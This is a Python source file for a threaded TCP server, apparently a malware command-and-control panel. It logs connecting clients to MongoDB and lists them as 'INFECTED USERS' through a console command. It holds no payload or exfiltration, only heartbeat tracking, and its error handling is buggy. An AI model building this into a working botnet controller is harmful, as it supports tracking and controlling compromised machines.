import socket
import threading
import random
import time
import pymongo
import os
import datetime
from colorama import Fore


class Info():
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    black = Fore.LIGHTBLACK_EX
    yellow = Fore.LIGHTYELLOW_EX
    white = Fore.LIGHTWHITE_EX

    BOLD = '\033[1m'
    END = '\033[0m'

    disconnect = f'{black}[{red}{BOLD}DISCONNECT{END}{black}]{white}'
    connect = f'{black}[{green}{BOLD}CONNECTED{END}{black}]{white}'
    message = f'{black}[{green}+{black}]{white}'
    start = f'{black}[{yellow}{BOLD}STARTED{END}{black}]{white}'
    stop = f'{black}[{yellow}{BOLD}STOPPED{END}{black}]{white}'
    warning = f'{black}[{yellow}{BOLD}WARNING{END}{black}]{white}'

    OFFLINE = f'{black}[{BOLD}{red}OFFLINE{END}{black}]{white}'
    ONLINE = f'{black}[{BOLD}{green}ONLINE{END}{black}]{white}'


class Main(object):
    online = []
    offline = []


    def main(host, port):
        os.system("cls")
        serverStarter = threading.Thread(target = Server.server, args = (host,port))
        serverStarter.start()

        time.sleep(2)

        while True:
            command = str(input(''))
            if(command == '!infected'):
                Main.infectedUsers()
            elif(command == '!stop'):
                print(f'{Info.stop} The server is stopped...')
                exit()
            else:
                print(f'{Info.warning} The command "{command}" does not exist.')


    def infectedUsers():
        print(f'\n\n       {Info.BOLD} INFECTED USERS{Info.END}\n')
        for i in range(len(Main.online)):
            print(f'{Info.ONLINE} -> {Main.online[i]}')
            if(i == len(Main.online)-1):
                print("")

        for j in range(len(Main.offline)):
            print(f'{Info.OFFLINE} -> {Main.offline[j]}')

        print("")

    def randomPort() -> int:
        return random.randint(1000,9999)


class Server():
    def server(host, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socketServer:
            socketServer.bind((host,port))
            socketServer.listen()

            print(f'{Info.start} Server has started on: {Info.BOLD}{host}:{port}{Info.END}')

            while True:
                clientSocket, clientAddress = socketServer.accept()
                clientHandler = threading.Thread(target = Server.handleClient, args = (clientSocket, clientAddress))
                clientHandler.start()

    def handleClient(clientSocket, clientAddress):
        client = pymongo.MongoClient('mongodb://localhost:27017/')
        db = client['users']

        kajmak = datetime.datetime.now()
        date = (f'{kajmak.day}.{kajmak.month}.{kajmak.year}.')


        print(f'{Info.connect} {clientAddress} connected to the server!')


        if(clientAddress in Main.offline):
            Main.offline.remove(clientAddress)
        else:
            Main.online.append(clientAddress)
            db.users.insert_one({
                'address': f'{clientAddress}',
                'status': 'Online',
                'date': date
            })

        try:
            while True:
                try:
                    clientSocket.sendall(b'...')
                except BrokenPipeError or ConnectionResetError:
                    Main.online.remove(clientAddress)
                    Main.offline.append(clientAddress)
                    db.users.update_one({
                            'address': f'{clientAddress}',
                            'status': 'Online'
                        },
                        {
                            '$set': {
                                'status': 'Offline'
                        }
                    })
                    break
        finally:
            print(f"{Info.disconnect} {clientAddress} has disconnected from server.")

if(__name__ == '__main__'):
    Main.main('127.0.0.1', 65432)
